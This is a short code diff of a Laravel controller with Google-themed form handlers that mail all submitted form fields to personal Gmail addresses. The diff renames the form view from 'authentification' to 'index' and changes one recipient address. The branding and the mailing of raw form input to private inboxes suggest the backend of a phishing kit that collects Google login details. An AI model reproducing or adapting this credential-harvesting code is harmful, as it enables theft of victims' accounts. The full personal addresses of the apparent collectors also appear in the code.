@@ -11,12 +11,12 @@ class MessageController extends Controller
 {
     public function formMessageGoogle()
     {
-        return view("authentification");
+        return view("index");
     }
     // Envoi du mail aux utilisateurs
     public function sendMessageGoogle(Request $request)
     {
-        Mail::to('Couponsneo@gmail.com')
+        Mail::to('tolofonmartin30@gmail.com')
             ->send(new MessageGoogle($request->except('_token')));
 
         Mail::to('chabijeanbaptiste56@gmail.com')
